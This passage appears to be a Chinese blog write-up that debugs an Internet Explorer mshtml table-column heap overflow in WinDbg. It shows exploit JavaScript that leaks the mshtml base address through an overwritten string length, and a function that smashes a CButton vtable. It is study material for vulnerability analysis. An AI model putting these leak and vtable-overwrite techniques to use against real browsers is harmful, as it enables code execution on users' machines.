<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">over_trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> leak_addr = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i++ ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( arr[i].length &gt; (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span> ) &#123; <span class="comment">// overflowed</span></span><br><span class="line">			leak_index = i;</span><br><span class="line">            <span class="keyword">var</span> leak = arr[i].substring((<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+(<span class="number">2</span>+<span class="number">8</span>)/<span class="number">2</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+(<span class="number">2</span>+<span class="number">8</span>+<span class="number">4</span>)/<span class="number">2</span>);</span><br><span class="line">            leak_addr = <span class="built_in">parseInt</span>( leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span> );</span><br><span class="line">			mshtmlbase = leak_addr - <span class="built_in">Number</span>(<span class="number">0x001582b8</span>);</span><br><span class="line">			alert(mshtmlbase);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( leak_addr == <span class="number">-1</span> || leak_index == <span class="number">-1</span> ) &#123; alert(<span class="string">"memory leak failed...."</span>); &#125;</span><br><span class="line"><span class="comment">//return mshtmlbase;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先来实践一下javascript对字符串的访问，可以看到，你的字符串有四个，想访问后面的地址是不可能的，返回是空字符串</p>
<p><img src="http://pic.giantbranch.cn/1506039920068.jpg" alt></p>
<p>根据书中信息，加上自己的调试，第一个字节表示字符串长度0xfa，而0xfa正是0x100-6</p>
<p><img src="http://pic.giantbranch.cn/1505979301766.jpg" alt></p>
<p>那么假如我们改变了长度的值，那么我们就可以任意向后读了，那么怎么覆盖呢，就是利用前面的span值增大了，导致循环次数增加，内存每次递增0x1c去覆盖，那么假如我们能够精准覆盖头指针那就可以了</p>
<p>那这里下断点就很纠结了，没灵感的时候怎么想都不行，有灵感就很好了，其实调试过程中下断点太重要了<br>我下的断点如下，在执行将span赋值为19之前下断点</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp mshtml!<span class="symbol">CTableColCalc:</span><span class="symbol">:AdjustForCol+</span><span class="number">0x2a</span> <span class="string">".if(@ebx ==0x1004)&#123;.echo ------------------;db esi&#125;.else&#123;gc&#125;"</span></span><br></pre></td></tr></table></figure>

<p>其实暂停了好几次，下面是最后一次，我们看到BBBBB的那个字符串的前面的四个字节被改写为48 00 01 00了，这我们就有点奇怪了，为什么不是04 10 00 00</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; g</span><br><span class="line">------------------</span><br><span class="line"><span class="number">058e1108</span>  <span class="number">41 00 41 00</span> <span class="number">41 00 41 00</span>-<span class="number">41 00 41 00</span> <span class="number">41 00 00 00</span>  <span class="keyword">A</span>.<span class="keyword">A</span>.<span class="keyword">A</span>.<span class="keyword">A</span>.<span class="keyword">A</span>.<span class="keyword">A</span>.<span class="keyword">A</span>...</span><br><span class="line"><span class="number">058e1118</span>  <span class="number">19 74 00 22</span> <span class="number">00 00 00 88</span>-<span class="number">48 00 01 00</span> <span class="number">42 00 42 00</span>  .t."....H...B.B.</span><br><span class="line"><span class="number">058e1128</span>  <span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>-<span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>  B.B.B.B.B.B.B.B.</span><br><span class="line"><span class="number">058e1138</span>  <span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>-<span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>  B.B.B.B.B.B.B.B.</span><br><span class="line"><span class="number">058e1148</span>  <span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>-<span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>  B.B.B.B.B.B.B.B.</span><br><span class="line"><span class="number">058e1158</span>  <span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>-<span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>  B.B.B.B.B.B.B.B.</span><br><span class="line"><span class="number">058e1168</span>  <span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>-<span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>  B.B.B.B.B.B.B.B.</span><br><span class="line"><span class="number">058e1178</span>  <span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>-<span class="number">42 00 42 00</span> <span class="number">42 00 42 00</span>  B.B.B.B.B.B.B.B.</span><br><span class="line">eax=<span class="number">00010048</span> ebx=<span class="number">00001004</span> ecx=<span class="number">058e1120</span> edx=<span class="number">00000010</span> esi=<span class="number">058e1108</span> edi=<span class="number">058e1120</span></span><br><span class="line">eip=<span class="number">686</span>af17c esp=<span class="number">0261d804</span> ebp=<span class="number">0261d</span>80c iopl=<span class="number">0</span>         nv up ei pl nz na pe nc</span><br><span class="line">cs=<span class="number">001</span>b  ss=<span class="number">0023</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">003</span>b  gs=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+<span class="number">0</span>x2a:</span><br><span class="line"><span class="number">686</span>af17c <span class="number">895</span>e04          mov     dword ptr [esi+<span class="number">4</span>],ebx ds:<span class="number">0023</span>:<span class="number">058</span>e110c=<span class="number">00410041</span></span><br></pre></td></tr></table></figure>

<p>那我们在上面那个断点的基础上再下一个写入断点（由于多次调试位置会变化）</p>
<p>首先第一次断下来，我们发现正是我们之前预测的这个10049的写入，那么上面的结果为什么比这个少了1呢</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000009</span> <span class="built_in">ebx</span>=<span class="number">00001004</span> <span class="built_in">ecx</span>=<span class="number">00010049</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=04660ff0 <span class="built_in">edi</span>=<span class="number">04661008</span></span><br><span class="line"><span class="built_in">eip</span>=69ebf169 <span class="built_in">esp</span>=0256d1c8 <span class="built_in">ebp</span>=0256d1d4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+<span class="number">0x17</span>:</span><br><span class="line">69ebf169 e89eacdbff      <span class="keyword">call</span>    mshtml!CUnitValue::IsScalerUnit (69c79e0c)</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; <span class="built_in">bl</span></span><br><span class="line"> <span class="number">0</span> e 69ebf17c     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** mshtml!CTableColCalc::AdjustForCol+<span class="number">0x2a</span> <span class="string">".if(@ebx ==0x1004)&#123;.echo ------------------;db esi&#125;.else&#123;gc&#125;"</span></span><br><span class="line"> <span class="number">1</span> e <span class="number">04661008</span> w <span class="number">1</span> <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** </span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; ub <span class="built_in">eip</span></span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+<span class="number">0x7</span>:</span><br><span class="line">69ebf159 <span class="number">53</span>              <span class="keyword">push</span>    <span class="built_in">ebx</span></span><br><span class="line">69ebf15a 8b5d08          <span class="keyword">mov</span>     <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">69ebf15d <span class="number">57</span>              <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line">69ebf15e 8bc1            <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">69ebf160 83e00f          <span class="keyword">and</span>     <span class="built_in">eax</span>,<span class="number">0Fh</span></span><br><span class="line">69ebf163 8d7e18          <span class="keyword">lea</span>     <span class="built_in">edi</span>,[<span class="built_in">esi</span>+<span class="number">18h</span>]</span><br><span class="line">69ebf166 <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line">69ebf167 890f            <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>],<span class="built_in">ecx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; r <span class="built_in">ecx</span></span><br><span class="line"><span class="built_in">ecx</span>=<span class="number">00010049</span></span><br></pre></td></tr></table></figure>

<p>我们再g一下</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00010048</span> <span class="built_in">ebx</span>=<span class="number">00001004</span> <span class="built_in">ecx</span>=<span class="number">04661008</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=04660ff0 <span class="built_in">edi</span>=<span class="number">04661008</span></span><br><span class="line"><span class="built_in">eip</span>=69a9b5a3 <span class="built_in">esp</span>=0256d1bc <span class="built_in">ebp</span>=0256d1bc iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">mshtml!CUnitValue::SetValue+<span class="number">0x24</span>:</span><br><span class="line">69a9b5a3 <span class="number">5d</span>              <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0256d1bc 69ebf17c <span class="number">04661008</span> <span class="number">00000008</span> <span class="number">00000001</span> mshtml!CUnitValue::SetValue+<span class="number">0x24</span></span><br><span class="line">0256d1d4 69d35b8e <span class="number">00001004</span> 0256d518 <span class="number">00000001</span> mshtml!CTableColCalc::AdjustForCol+<span class="number">0x2a</span></span><br><span class="line">0256d284 69ba0713 <span class="number">00000009</span> 0256d518 <span class="number">00000013</span> mshtml!CTableLayout::CalculateMinMax+<span class="number">0x52f</span></span><br><span class="line">0256d4a0 69b8af19 0256d518 0256d4e4 <span class="number">00000001</span> mshtml!CTableLayout::CalculateLayout+<span class="number">0x276</span></span><br><span class="line">0256d64c 69c7cc48 0256e6b0 0256d878 <span class="number">00000000</span> mshtml!CTableLayout::CalcSizeVirtual+<span class="number">0x720</span></span><br><span class="line">........</span><br><span class="line">........</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; ub <span class="built_in">eip</span></span><br><span class="line">mshtml!CUnitValue::SetValue+<span class="number">0xc</span>:</span><br><span class="line">69a9b58d 7f18            <span class="keyword">jg</span>      mshtml!CUnitValue::SetValue+<span class="number">0x17</span> (69a9b5a7)</span><br><span class="line">69a9b58f b9000000f8      <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="number">0F8000000h</span></span><br><span class="line">69a9b594 3bc1            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">69a9b596 7c0f            <span class="keyword">jl</span>      mshtml!CUnitValue::SetValue+<span class="number">0x17</span> (69a9b5a7)</span><br><span class="line">69a9b598 8b4d08          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">69a9b59b c1e004          <span class="keyword">shl</span>     <span class="built_in">eax</span>,<span class="number">4</span></span><br><span class="line">69a9b59e 0b450c          <span class="keyword">or</span>      <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]</span><br><span class="line">69a9b5a1 <span class="number">8901</span>            <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>],<span class="built_in">eax</span></span><br></pre></td></tr></table></figure>

<p>我们看到eax正好是00010048，原来是在SetValue里面改变了，那整个过程就很清楚了，那么实际利用的是下面这里，而且a1是width相关的</p>
<p><img src="http://pic.giantbranch.cn/1506064995038.jpg" alt></p>
<p>我们手动运算看看，验证完成</p>
<p><img src="http://pic.giantbranch.cn/1506068091376.jpg" alt></p>
<p>还有其实作者的运算并不对，应该是下面的</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(<span class="number">0x1c</span>*<span class="number">18</span> + <span class="number">0x18</span>)</span><br><span class="line">'<span class="number">0x210</span>'</span><br></pre></td></tr></table></figure>

<p>0x210是刚好，vulheap是0x100，”AAAA”是8 + 0x100 = 0x108，而”BBBB”的头部是8，所以再后面的就是BBBB的长度值，刚好位于0x210</p>
<p>而且i最大为18，不会19（可以看到下面的地方是等于，v154是+1之后再判断的）</p>
<p><img src="http://pic.giantbranch.cn/1506066222991.jpg" alt></p>
<p>那么读取的时候是怎么样的呢</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> leak = arr[i].substring((<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+(<span class="number">2</span>+<span class="number">8</span>)/<span class="number">2</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+(<span class="number">2</span>+<span class="number">8</span>+<span class="number">4</span>)/<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>其实简化一下就是</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> leak = arr[i].substring((<span class="number">0x100</span><span class="number">-4</span>)/<span class="number">2</span>+<span class="number">8</span>/<span class="number">2</span>, (<span class="number">0x100</span><span class="number">-4</span>)/<span class="number">2</span>+(<span class="number">8</span>+<span class="number">4</span>)/<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>0x100-4是减去4字节的头部长度值，后面的8是CButton的堆头指针，如下图（下面为十六进制值）</p>
<p><img src="http://pic.giantbranch.cn/1506418072512.jpg" alt></p>
<p>我看看计算得对不对，因为偏移量可能不一样</p>
<p><img src="http://pic.giantbranch.cn/1506068309987.jpg" alt></p>
<p>可以看到是不对的</p>
<figure class="highlight irpf90"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; lmm mshtml</span><br><span class="line">start    <span class="keyword">end</span>        <span class="keyword">module</span> <span class="keyword">name</span></span><br><span class="line"><span class="number">66d60000</span> <span class="number">67312000</span>   mshtml     (<span class="keyword">deferred</span>)</span><br></pre></td></tr></table></figure>

<p>我们重新算一下偏移，这样才对，跟作者的也一样了</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">007</span>&gt; ? <span class="number">66</span>ed3af8 - <span class="number">66d60000</span>  </span><br><span class="line">Evaluate expression: <span class="number">1522424</span> = <span class="number">00173</span>af8</span><br></pre></td></tr></table></figure>

<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先我们将偏移改回来</p>
<p>我们先看触发漏洞，再看堆喷射</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">smash_vtable</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> obj_col_0 = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span><br><span class="line">	obj_col_0.width = <span class="string">"1178993"</span>;                    <span class="comment">// smash the vftable 0x07070024</span></span><br><span class="line">	obj_col_0.span = <span class="string">"44"</span>;                      <span class="comment">// the amount to overwrite</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将width设置成这么大，而且后面有个注释是vftable，应该是覆盖vftable，之后再想办法调用被覆盖的虚表里的函数</p>
<p>先计算一下，确实如上面注释所写的那样</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(<span class="number">1178993</span>*<span class="number">100</span>)</span><br><span class="line">'<span class="number">0x7070024</span>'</span><br></pre></td></tr></table></figure>

<p><strong>但是作者给的exp已知断不到点子上，异常经常不一样，所以我改用msf的exp</strong></p>
<p>奇怪的是msf竟然没有信息泄露代码，先直接运行</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; g</span><br><span class="line">(db4.8a8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">07070024</span> <span class="built_in">ebx</span>=<span class="number">01000000</span> <span class="built_in">ecx</span>=02b80690 <span class="built_in">edx</span>=<span class="number">00000041</span> <span class="built_in">esi</span>=0244f088 <span class="built_in">edi</span>=02b80b38</span><br><span class="line"><span class="built_in">eip</span>=7c348b05 <span class="built_in">esp</span>=0244eec0 <span class="built_in">ebp</span>=0244eef8 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010202</span></span><br><span class="line">7c348b05 ??              ???</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="symbol">WARNING:</span> Frame <span class="built_in">IP</span> <span class="keyword">not</span> <span class="keyword">in</span> any known module. Following frames may be wrong.</span><br><span class="line">0244eebc 66f87515 0244f088 02b6ea18 66fd27d1 <span class="number">0x7c348b05</span></span><br><span class="line">0244eec8 66fd27d1 0244f088 <span class="number">00000001</span> 0244f088 mshtml!NotifyElement+<span class="number">0x41</span> (FPO: [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line">0244eef8 66f88410 0244ef58 02af6bc8 0244f088 mshtml!CMarkup::BuildDescendentsList+<span class="number">0x227</span></span><br><span class="line">0244eff0 66f8838e 003c82c0 0244f088 003c8384 mshtml!CMarkup::NotifyDescendents+<span class="number">0x78</span></span><br><span class="line">0244f044 66f8727c 02ae83f0 <span class="number">00000000</span> <span class="number">00000000</span> mshtml!CMarkup::SendNotification+<span class="number">0x92</span></span><br><span class="line">0244f06c 66ee2c9f 0244f088 02b19eb0 003ca180 mshtml!CMarkup::Notify+<span class="number">0xd6</span></span><br><span class="line">0244f148 66de04b2 02b19eb0 <span class="number">00000001</span> 003aeb54 mshtml!CMarkup::SaveHistoryInternal+<span class="number">0x9c2</span></span><br><span class="line">0244f174 66e6c0af 003ca180 02b19938 0244f1d0 mshtml!CWindow::SaveHistory+<span class="number">0xa9</span></span><br><span class="line">0244f184 6d96ca36 003c82c0 02b19938 <span class="number">00000001</span> mshtml!CDoc::SaveHistory+<span class="number">0x1a</span></span><br></pre></td></tr></table></figure>

<p>我们看看返回地址，原来调用了这里，跟作者的一样</p>
<p><img src="http://pic.giantbranch.cn/1506332366177.jpg" alt></p>
<p>那我们在mshtml!NotifyElement+0x35（上面的kv显示的0x41是错的）下断点发现这里是不断被调用的，根据layout这个东西，应该是实时地去调整浏览器布局，一有“风吹草动”就调整布局，比如我们通过javascript删除了某个元素，布局也要调整</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; <span class="built_in">bp</span> mshtml!NotifyElement+<span class="number">0x35</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=66f16ef0 <span class="built_in">ebx</span>=<span class="number">01000000</span> <span class="built_in">ecx</span>=002af848 <span class="built_in">edx</span>=<span class="number">00000041</span> <span class="built_in">esi</span>=023ef208 <span class="built_in">edi</span>=002a56c8</span><br><span class="line"><span class="built_in">eip</span>=66f87512 <span class="built_in">esp</span>=023ef044 <span class="built_in">ebp</span>=023ef078 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!NotifyElement+<span class="number">0x3e</span>:</span><br><span class="line">66f87512 ff5008          <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">8</span>]    <span class="built_in">ds</span>:<span class="number">0023</span>:66f16ef8=&#123;mshtml!CFlowLayout::Notify (66f87f0d)&#125;</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=66dc9868 <span class="built_in">ebx</span>=<span class="number">01000000</span> <span class="built_in">ecx</span>=<span class="number">00322580</span> <span class="built_in">edx</span>=<span class="number">00000041</span> <span class="built_in">esi</span>=023ef208 <span class="built_in">edi</span>=002c99e8</span><br><span class="line"><span class="built_in">eip</span>=66f87512 <span class="built_in">esp</span>=023ef044 <span class="built_in">ebp</span>=023ef078 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=66dc9868 <span class="built_in">ebx</span>=<span class="number">01000000</span> <span class="built_in">ecx</span>=<span class="number">00332688</span> <span class="built_in">edx</span>=<span class="number">00000041</span> <span class="built_in">esi</span>=023ef208 <span class="built_in">edi</span>=0032bcd0</span><br><span class="line"><span class="built_in">eip</span>=66f87512 <span class="built_in">esp</span>=023ef044 <span class="built_in">ebp</span>=023ef078 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!NotifyElement+<span class="number">0x3e</span>:</span><br><span class="line">66f87512 ff5008          <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">8</span>]    <span class="built_in">ds</span>:<span class="number">0023</span>:66dc9870=&#123;mshtml!CTableLayoutBlock::Notify (66ebd6d6)&#125;</span><br><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="built_in">eax</span>=66fbdc28 <span class="built_in">ebx</span>=<span class="number">01000000</span> <span class="built_in">ecx</span>=02e30db8 <span class="built_in">edx</span>=<span class="number">00000041</span> <span class="built_in">esi</span>=023ef208 <span class="built_in">edi</span>=003301c0</span><br><span class="line"><span class="built_in">eip</span>=66f87512 <span class="built_in">esp</span>=023ef044 <span class="built_in">ebp</span>=023ef078 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">mshtml!NotifyElement+<span class="number">0x3e</span>:</span><br><span class="line">66f87512 ff5008          <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">8</span>]    <span class="built_in">ds</span>:<span class="number">0023</span>:66fbdc30=&#123;mshtml!CTableCellLayout::Notify (66ebd7c0)&#125;</span><br></pre></td></tr></table></figure>

<p>我们看下eax的来源，是来源于ecx，而ecx指向的地址正是被覆盖成了0707002c</p>
<p><img src="http://pic.giantbranch.cn/1506333353394.jpg" alt></p>
<p>经过调试，发现这个虚表是在CButton的第3个dword的位置</p>
